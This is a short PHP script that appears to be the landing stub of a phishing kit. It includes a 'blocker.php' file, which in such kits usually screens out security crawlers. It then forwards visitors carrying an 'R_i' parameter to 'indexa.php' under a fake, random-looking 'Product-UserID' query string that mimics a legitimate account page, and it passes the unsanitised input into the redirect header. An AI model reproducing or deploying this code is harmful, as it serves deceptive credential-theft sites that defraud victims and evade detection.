<?php 
include('blocker.php');

if(isset($_GET['R_i']))
{
		$fr2 = $_GET['R_i'];

	header('Location: indexa.php?P=_93894574342hdfjsixaoweue5_j1489738549283781331983743fncn_Product-UserID&R_i='.$fr2);
    exit;
}
	
?>